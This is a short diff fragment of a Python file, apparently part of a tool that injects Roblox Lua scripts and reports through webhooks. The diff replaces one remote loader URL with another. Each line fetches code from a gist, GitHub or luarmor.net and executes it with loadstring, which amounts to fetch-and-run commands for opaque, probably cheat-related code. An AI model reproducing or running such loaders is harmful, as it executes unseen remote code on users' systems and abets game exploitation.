@@ -13,7 +13,7 @@ CANDIDATE_WEBHOOK_FILES = [
 
 COMPACT_SCRIPT = (
     'loadstring(game:HttpGet("https://gist.githubusercontent.com/quystptv00383-commits/7dde495f53b84afb7cf64c06c15dfe2d/raw/loader.luau?t=" .. os.time()))()\n'
-    'loadstring(game:HttpGet("https://raw.githubusercontent.com/duymanhm6-cyber/wukonghud/refs/heads/main/wukonghud"))()'
+    'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/aa53ff8c86c6c5711408096c227bbe91.lua"))()'
 )
 
 def load_webhook_url():
